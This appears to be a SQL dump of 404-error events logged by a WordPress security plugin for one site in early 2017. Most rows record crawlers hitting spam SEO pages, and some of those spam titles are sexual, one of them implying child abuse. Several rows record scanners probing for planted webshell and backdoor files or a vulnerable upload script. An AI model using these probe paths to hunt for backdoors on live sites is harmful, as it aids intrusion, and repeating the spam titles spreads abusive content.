INSERT INTO `cmrfu_aiowps_events` VALUES("10608","404","","0","2017-01-31 22:43:36","51.15.46.11","","/statistics.php/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10609","404","","0","2017-01-31 22:43:37","51.15.46.11","","/includes/database.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10610","404","","0","2017-01-31 22:43:38","51.15.46.11","","/includes/database.php/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10611","404","","0","2017-01-31 22:43:39","51.15.46.11","","/gate.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10612","404","","0","2017-01-31 22:43:39","51.15.46.11","","/gate.php/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10613","404","","0","2017-01-31 22:43:40","51.15.46.11","","/includes/commands.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10614","404","","0","2017-01-31 22:43:41","51.15.46.11","","/includes/commands.php/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10615","404","","0","2017-01-31 22:43:42","51.15.46.11","","/css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10616","404","","0","2017-01-31 22:43:43","51.15.46.11","","/css/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10617","404","","0","2017-01-31 22:43:44","51.15.46.11","","/css/table_view.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10618","404","","0","2017-01-31 22:43:45","51.15.46.11","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10619","404","","0","2017-01-31 22:43:47","51.15.46.11","","/login.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10620","404","","0","2017-01-31 22:46:45","91.200.12.60","http://herkonyapi.com/wp-content/plugins/wp-image-news-slider/js/swfupload/js/upload.php","/wp-content/plugins/wp-image-news-slider/js/swfupload/js/upload.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10621","404","","0","2017-01-31 22:55:52","66.249.66.40","","/foa/rohel.php?hl=Bring-It-On-320kbps-in-dj","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10622","404","","0","2017-01-31 23:29:48","42.236.99.154","http://www.herkonyapi.com/stds/priyansi-all-performance.html","/stds/priyansi-all-performance.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10623","404","","0","2017-02-01 01:27:35","66.249.66.37","","/foa/rohel.php?hl=download-naagin-2-episode","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10624","404","","0","2017-02-01 01:33:20","204.79.180.53","http://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10625","404","","0","2017-02-01 02:56:22","66.249.66.43","","/stds/ik-vaari-haam-kah-de-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10626","404","","0","2017-02-01 03:03:31","117.14.146.37","","/stds/ek-vaari-ha-aayushman-video-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10627","404","","0","2017-02-01 03:03:57","66.249.66.37","","/stds/avni-from-namkaran-photos.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10628","404","","0","2017-02-01 03:07:44","66.249.66.37","","/stds/ban-ve-ky-thuat-gia-ngang.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10629","404","","0","2017-02-01 03:26:41","66.249.66.43","","/stds/yad-lagla-dj-sagar-barshi.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10630","404","","0","2017-02-01 03:55:32","66.249.66.40","","/roplt4/ik-bar-hor-so.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10631","404","","0","2017-02-01 03:56:46","40.77.167.89","","/stds/ik-vari-haan-karde-video-songs-of-ayush-man.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10632","404","","0","2017-02-01 04:09:06","66.249.66.40","","/stds/video-aa-gatot-lagi-mesum.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10633","404","","0","2017-02-01 04:12:40","66.249.66.43","","/stds/ik-wari-haan-karde-soniye.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10634","404","","0","2017-02-01 04:28:23","40.77.167.44","","/stds/pagnense-dag-dur-korar-upay.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10635","404","","0","2017-02-01 06:31:36","66.249.66.40","","/foa/rohel.php?hl=-ye-dil-h-muskil-movie-hd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10636","404","","0","2017-02-01 06:58:58","66.249.66.37","","/stds/bulatt-ta-rakhiya-patake-pon-nu-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10637","404","","0","2017-02-01 07:04:04","66.249.66.37","","/stds/ub-fair-cream-review-hindi.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10638","404","","0","2017-02-01 07:19:33","66.249.66.40","","/roplt4/kon-tujhy-yun-pyar-karegy-jesy-mai-krti.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10639","404","","0","2017-02-01 07:24:34","66.249.66.40","","/roplt4/sanchi-mobail-rington.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10640","404","","0","2017-02-01 08:01:29","66.249.66.37","","/roplt4/bai-va.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10641","404","","0","2017-02-01 08:01:30","66.249.66.43","","/roplt4/bai-va.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10642","404","","0","2017-02-01 08:19:10","207.46.13.184","","/stds/pagnense-dag-dur-korar-upay.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10643","404","","0","2017-02-01 08:30:17","66.249.66.43","","/roplt4/chad-ke-nahi-gyi-song-dj-panjab-com.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10644","404","","0","2017-02-01 09:11:30","66.249.66.37","","/roplt4/sairat--me-tuza-parsha-mp3-song-download.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10645","404","","0","2017-02-01 09:20:12","157.55.39.74","","/stds/tu-krama-vali-hai-new-punjabi-song-downlo.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10646","404","","0","2017-02-01 09:20:13","157.55.39.74","","/stds/devi-film-chalmar-song-choreographer.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10647","404","","0","2017-02-01 10:17:54","66.249.66.40","","/foa/rohel.php?hl=www.chatha.videor.pm3.com","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10648","404","","0","2017-02-01 10:23:32","204.79.180.78","http://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10649","404","","0","2017-02-01 10:56:05","106.39.204.234","","/_vti_bin/owssvr.dll?UL=1&amp;ACT=4&amp;BUILD=6606&amp;STRMVER=4&amp;CAPREQ=0","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10650","404","","0","2017-02-01 10:56:06","106.39.204.234","","/MSOffice/cltreq.asp?UL=1&amp;ACT=4&amp;BUILD=6606&amp;STRMVER=4&amp;CAPREQ=0","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10651","404","","0","2017-02-01 11:02:26","66.249.66.40","","/stds/cara-menghapus-kontak-imo.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10652","404","","0","2017-02-01 11:32:46","66.249.66.37","","/stds/man-kare-ki-khi-na-jai-so.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10653","404","","0","2017-02-01 11:59:17","66.249.66.37","","/stds/ik-bari-haan-keha-mutyare.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10654","404","","0","2017-02-01 12:00:22","176.119.3.70","","/wp-content/plugins/jquery-colorbox/css/syslib.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10655","404","","0","2017-02-01 13:34:45","66.249.66.43","","/roplt4/bhaina-kana-kalase-odiya-film-original-mp-3.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10656","404","","0","2017-02-01 14:22:22","46.4.116.197","","/roplt4/%E0%A6%AC%E0%A6%A8%E0%A7%8D%E0%A6%A7%E0%A7%81%E0%A6%B0-%E0%A6%AE%E0%A6%BE/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10657","404","","0","2017-02-01 14:22:49","46.4.116.197","","/roplt4/%E0%A6%AC%E0%A6%A8%E0%A7%8D%E0%A6%A7%E0%A7%81%E0%A6%B0-%E0%A6%B8%E0%A7%87%E0%A6%95%E0%A7%8D%E0%A6%B8%E0%A7%80-%E0%A6%AE%E0%A6%BE%E0%A6%95%E0%A7%87-%E0%A6%9A%E0%A7%8B%E0%A6%A6-3/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10658","404","","0","2017-02-01 15:21:01","66.249.66.37","","/foa/rohel.php?hl=Download-Break-up-song-ae","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10659","404","","0","2017-02-01 16:33:18","204.79.180.142","http://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10660","404","","0","2017-02-01 17:21:06","198.71.239.4","http://herkonyapi.com/wp-admin/js/gallery.php","/wp-admin/js/gallery.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10661","404","","0","2017-02-01 17:21:09","50.62.161.240","http://herkonyapi.com/wp-admin/js/gallery.php","/wp-admin/js/gallery.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10662","404","","0","2017-02-01 17:27:24","66.249.66.43","http://www.herkonyapi.com/lui/glnoa.php?hl=HentaiShare-Thomas-the-Molester-2","/style.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10663","404","","0","2017-02-01 18:07:03","104.238.117.233","","/wp-content/themes/twentytwelve/help.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10664","404","","0","2017-02-01 18:07:09","104.238.117.233","","/wp-includes/SimplePie/Cache/help.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10665","404","","0","2017-02-01 18:07:16","104.238.117.233","","/wp-content/plugins/wordpress-seo/images/javascript.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10666","404","","0","2017-02-01 18:07:21","104.238.117.233","","/wp-content/uploads/2015/05/stats.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10667","404","","0","2017-02-01 19:06:34","66.249.66.40","","/stds/cortana-abra-o-pior-julho.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10668","404","","0","2017-02-01 19:25:31","66.249.66.40","","/stds/letra-da-edmazia-alma-nua.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10669","404","","0","2017-02-01 19:36:57","66.249.66.37","","/stds/cara-mencari-4-angka-jadi.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10670","404","","0","2017-02-01 19:37:13","207.46.13.184","","/stds/foto-de-paulo-zulu-sem-tarja.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10671","404","","0","2017-02-01 19:40:42","66.249.66.40","","/stds/cherry-season-episodio-19.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10672","404","","0","2017-02-01 20:24:09","66.249.66.40","","/foa/rohel.php?hl=patan-si-largayi-ho-songs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10673","404","","0","2017-02-01 22:35:40","195.93.165.130","http://herkonyapi.com/dump.php","/dump.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10674","404","","0","2017-02-01 22:35:43","217.174.252.174","http://herkonyapi.com/dump.php","/dump.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10675","404","","0","2017-02-01 23:44:26","85.138.70.50","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10676","404","","0","2017-02-02 01:14:15","66.249.66.43","","/foa/rohel.php?hl=anu-dubey-chhath-song-mp3","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10677","404","","0","2017-02-02 02:15:01","204.79.180.12","http://www.herkonyapi.com/portfolio-item/hervenik-dubleks-6/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10678","404","","0","2017-02-02 02:36:14","66.249.66.40","","/stds/dia-li-lop-9-bai-4-phan-2.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10679","404","","0","2017-02-02 02:36:48","66.249.66.43","","/stds/du-doan-ket-qua-xo-so-hue.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10680","404","","0","2017-02-02 02:37:32","66.249.66.37","","/stds/euromillion-le-30-09-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10681","404","","0","2017-02-02 02:37:58","66.249.66.40","","/stds/gambar-alam-simetri-putar.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10682","404","","0","2017-02-02 02:39:03","66.249.66.43","","/stds/hinh-gai-dep-xinh-mon-mon.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10683","404","","0","2017-02-02 02:39:13","66.249.66.37","","/stds/achi-baat-images-in-hindi.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10684","404","","0","2017-02-02 02:39:33","66.249.66.37","","/stds/engineering-mode-le-eco-2.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10685","404","","0","2017-02-02 03:06:08","40.77.167.87","","/stds/cristina-mihaela-ai-stil.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10686","404","","0","2017-02-02 03:16:09","66.249.66.43","","/foa/rohel.php?hl=Hunju-dig-di-song-dowanlod","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10687","404","","0","2017-02-02 03:46:28","66.249.66.60","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10688","404","","0","2017-02-02 04:06:19","66.249.66.60","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10689","404","","0","2017-02-02 04:35:54","40.77.167.87","","/stds/cristina-mihaela-ai-stil.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10690","404","","0","2017-02-02 05:07:45","97.74.24.189","http://herkonyapi.com/themes66.php","/themes66.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10691","404","","0","2017-02-02 05:07:47","10.3.206.188","http://herkonyapi.com/themes66.php","/themes66.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10692","404","","0","2017-02-02 05:24:14","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/4256927431.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10693","404","","0","2017-02-02 05:47:06","40.77.167.79","","/stds/chad-gayi-oye-lyrics-in-punjabi.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10694","404","","0","2017-02-02 06:12:19","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/1270534287.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10695","404","","0","2017-02-02 06:49:58","66.249.66.60","","/.well-known/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10696","404","","0","2017-02-02 07:07:56","144.76.4.148","","/roplt4/kasam-hai-tuze-aa-bhi-ja-actress-images.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10697","404","","0","2017-02-02 07:29:48","40.77.167.87","","/stds/confrontos-da-proxima-rodada-serie-a-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10698","404","","0","2017-02-02 07:32:38","157.55.39.6","","/stds/tere-samne-suside-kardu-full-hd-video-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10699","404","","0","2017-02-02 07:32:48","157.55.39.6","","/stds/tere-samne-suside-kardu-full-hd-video-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10700","404","","0","2017-02-02 07:32:57","157.55.39.6","","/stds/tere-samne-suside-kardu-full-hd-video-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10701","404","","0","2017-02-02 08:18:07","66.249.66.37","","/foa/rohel.php?hl=ae-dil-mushkil-ae-jana-mp3","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10702","404","","0","2017-02-02 09:33:54","66.249.66.40","","/foa/rohel.php?hl=nase-si-chadh-gyi-ful-hd-s","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10703","404","","0","2017-02-02 10:01:30","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/3527297821.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10704","404","","0","2017-02-02 10:41:11","66.249.66.40","","/stds/status-perfeito-para-foto.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10705","404","","0","2017-02-02 10:42:36","66.249.66.37","","/stds/sony-super-dancer-mahi-in.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10706","404","","0","2017-02-02 10:42:39","66.249.66.40","","/stds/qual-prefeito-eleito-de-s.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10707","404","","0","2017-02-02 10:42:45","66.249.66.40","","/stds/ansuman-song-tu-meri-asqu.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10708","404","","0","2017-02-02 10:43:09","66.249.66.37","","/stds/upcpat2016-counsling-date.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10709","404","","0","2017-02-02 10:43:46","66.249.66.43","","/stds/janda-usia-50-tahun-bugil.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10710","404","","0","2017-02-02 10:44:04","66.249.66.60","","/stds/bring-it-on-new-dj-songs.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10711","404","","0","2017-02-02 10:44:34","66.249.66.40","","/stds/cewek-seksi-di-mma-tv-one.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10712","404","","0","2017-02-02 10:45:05","66.249.66.40","","/stds/ae-dil-muskil-mp3-full-hd.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10713","404","","0","2017-02-02 10:45:22","66.249.66.37","","/stds/hotstar-and-jio-login-fai.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10714","404","","0","2017-02-02 10:49:41","66.249.66.37","","/foa/rohel.php?hl=mp3-pallapa-gegunung-kulon","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10715","404","","0","2017-02-02 12:00:43","184.168.152.95","http://herkonyapi.com/object84.php","/object84.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10716","404","","0","2017-02-02 12:01:04","72.167.190.150","http://herkonyapi.com/wp-includes/SimplePie/Cache/utf82.php","/wp-includes/SimplePie/Cache/utf82.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10717","404","","0","2017-02-02 12:01:12","212.247.229.8","http://herkonyapi.com/dir35.php","/dir35.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10718","404","","0","2017-02-02 12:01:18","198.71.236.20","http://herkonyapi.com/error.php","/error.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10719","404","","0","2017-02-02 12:05:29","66.249.66.37","","/foa/rohel.php?hl=ae-dil-ha-muskil-al-song-3gp","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10720","404","","0","2017-02-02 12:56:17","66.249.66.40","","/roplt4/Dekha-photo-100-bar-mp3.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10721","404","","0","2017-02-02 13:21:16","66.249.66.43","","/foa/rohel.php?hl=chhath-pujay-pawan-singh-mp3","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10722","404","","0","2017-02-02 14:37:05","66.249.66.37","","/foa/rohel.php?hl=snopsis-ji-woon-sang-pembela","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10723","404","","0","2017-02-02 15:52:51","66.249.66.40","","/foa/rohel.php?hl=nase-se-chad-gai-songspk.com","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10724","404","","0","2017-02-02 16:08:18","204.79.180.141","http://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10725","404","","0","2017-02-02 16:57:16","40.77.167.87","","/stds/phone-m-teri-photo-dekhu-so-so-baar-hd-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10726","404","","0","2017-02-02 17:08:54","66.249.66.40","","/foa/rohel.php?hl=www.a-dil-mus-song-audio-mp3","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10727","404","","0","2017-02-02 18:24:22","66.249.66.40","","/foa/rohel.php?hl=ik-vari-ha-kheb-da-by-auisman","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10728","404","","0","2017-02-02 19:40:55","66.249.66.40","","/foa/rohel.php?hl=acha-chalta-hu-pagalworld.com","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10729","404","","0","2017-02-02 20:51:04","66.249.66.43","http://www.herkonyapi.com/lui/glnoa.php?hl=Keygen-download-ccleaner-home-key","/style.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10730","404","","0","2017-02-02 20:56:49","66.249.66.40","","/foa/rohel.php?hl=Konser-iwan-fals-d-cilegon","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10731","404","","0","2017-02-02 21:22:47","66.249.66.37","","/stds/moon-lovers-ep-13-eng-sub.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10732","404","","0","2017-02-02 21:25:00","66.249.66.40","","/stds/www.z-world-kumkum-bhagya.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10733","404","","0","2017-02-02 21:25:41","66.249.66.43","","/stds/atalaya-15-noviembre-1988.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10734","404","","0","2017-02-02 21:25:50","66.249.66.40","","/stds/tujat-jiv-rangla-mps-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10735","404","","0","2017-02-02 21:25:59","66.249.66.37","","/stds/sjava---baba-datafilehost.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10736","404","","0","2017-02-02 21:26:18","66.249.66.37","","/stds/entre-amigos-comic-starco.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10737","404","","0","2017-02-02 21:26:27","66.249.66.60","","/stds/khs-halal-devi-geet-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10738","404","","0","2017-02-02 21:26:29","66.249.66.37","","/stds/sonare-sonare-kaca-ainare.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10739","404","","0","2017-02-02 21:28:26","66.249.66.37","","/stds/eu-sou-franky-2-temporada.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10740","404","","0","2017-02-02 21:30:13","66.249.66.43","","/stds/pes-pc-2017-install-setup.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10741","404","","0","2017-02-02 21:39:46","66.249.66.37","","/roplt4/ae-dil-h-muskil-song-video-in-1080-kbps-download-djpunjab-com.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10742","404","","0","2017-02-02 21:39:53","66.249.66.40","","/roplt4/ae-dil-h-muskil-song-video-in-1080-kbps-download-djpunjab-com.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10743","404","","0","2017-02-02 22:11:44","66.249.66.40","","/foa/rohel.php?hl=Nasa-se-chad-gaiyi-mr.jatt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10744","404","","0","2017-02-02 23:40:25","89.184.69.211","http://herkonyapi.com/dir35.php","/dir35.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10745","404","","0","2017-02-02 23:40:29","50.87.144.100","http://herkonyapi.com/dir35.php","/dir35.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10746","404","","0","2017-02-03 00:41:59","204.79.180.253","http://www.herkonyapi.com/portfolio-item/hervenik-dubleks-6/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10747","404","","0","2017-02-03 00:43:19","66.249.66.37","","/foa/rohel.php?hl=pagalworld.in-ik-vari-song","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10748","404","","0","2017-02-03 01:59:10","66.249.66.43","","/foa/rohel.php?hl=Vijay-bairavaa-movie-songs","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10749","404","","0","2017-02-03 02:26:48","66.249.66.43","","/foa/rohel.php?hl=Jitna-mai-pyar-karega-song","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10750","404","","0","2017-02-03 02:27:39","66.249.66.37","","/foa/rohel.php?hl=Best-diwali-video-download","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10751","404","","0","2017-02-03 02:36:06","66.249.66.40","","/foa/rohel.php?hl=force-2-movies-mahive-song","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10752","404","","0","2017-02-03 03:26:45","66.249.66.37","","/foa/rohel.php?hl=the-breakup-song-video-new","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10753","404","","0","2017-02-03 04:39:21","66.249.66.60","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10754","404","","0","2017-02-03 05:03:23","66.249.66.43","","/foa/rohel.php?hl=ye-dil-hai-mushkil-mp4-mov","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10755","404","","0","2017-02-03 05:14:46","66.249.66.40","","/stds/status-hindi-maata-rani.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10756","404","","0","2017-02-03 05:18:10","66.249.66.37","","/foa/rohel.php?hl=katty-indera-caci-maki-will","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10757","404","","0","2017-02-03 05:20:00","66.249.66.60","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10758","404","","0","2017-02-03 05:22:56","208.113.168.202","http://herkonyapi.com/object84.php","/object84.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10759","404","","0","2017-02-03 05:23:04","177.39.54.82","http://herkonyapi.com/object84.php","/object84.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10760","404","","0","2017-02-03 06:00:15","207.46.13.153","","/stds/tin-hoc-bai-4-lop-8.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10761","404","","0","2017-02-03 06:02:19","66.249.66.40","","/stds/terra-rometida-cpitulo-70.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10762","404","","0","2017-02-03 06:02:34","66.249.66.37","","/stds/cda-filmy-2016-z-lektorem.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10763","404","","0","2017-02-03 06:02:42","66.249.66.37","","/stds/chum-search-disinstallare.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10764","404","","0","2017-02-03 06:03:04","66.249.66.37","","/stds/historia-de-lady-coralina.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10765","404","","0","2017-02-03 06:04:33","66.249.66.43","","/stds/fete-care-isi-cauta-iubit.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10766","404","","0","2017-02-03 06:04:43","66.249.66.40","","/stds/dp-whatsapp-muharram-1438.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10767","404","","0","2017-02-03 06:05:03","66.249.66.37","","/stds/kws-recrutiment-date-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10768","404","","0","2017-02-03 06:06:11","40.77.167.87","","/stds/sgp-syair-jawa.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10769","404","","0","2017-02-03 07:02:40","207.46.13.74","","/stds/download-video-ngentot-mama-dan-anak-kecil.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10770","404","","0","2017-02-03 07:49:37","66.249.66.40","","/foa/rohel.php?hl=aye-dil-hai-mushkil-pagalwo","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10771","404","","0","2017-02-03 08:52:53","87.236.20.33","http://herkonyapi.com/error.php","/error.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10772","404","","0","2017-02-03 08:52:56","182.50.130.1","http://herkonyapi.com/error.php","/error.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10773","404","","0","2017-02-03 09:05:24","66.249.66.40","","/foa/rohel.php?hl=saiya-breakup-song-dounlode","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10774","404","","0","2017-02-03 09:14:25","66.249.66.40","","/foa/rohel.php?hl=Gaali-chhath-geet-khesari-lal-mp3-songs-free-download","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10775","404","","0","2017-02-03 09:27:36","91.224.22.113","http://herkonyapi.com/wp-content/uploads/2014/10/press64.php","/wp-content/uploads/2014/10/press64.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10776","404","","0","2017-02-03 09:27:40","192.254.250.160","http://herkonyapi.com/wp-content/uploads/2014/10/press64.php","/wp-content/uploads/2014/10/press64.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10777","404","","0","2017-02-03 10:20:49","173.201.196.164","http://herkonyapi.com/dirs.php","/dirs.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10778","404","","0","2017-02-03 10:21:39","66.249.66.37","","/foa/rohel.php?hl=remo-lve-dialogue-ringtones","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10779","404","","0","2017-02-03 10:21:47","182.50.151.58","http://herkonyapi.com/dirs.php","/dirs.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("10780","404","","0","2017-02-03 11:36:58","66.249.66.40","","/foa/rohel.php?hl=Swapan-me-jua-khelne-ka-fal","","");
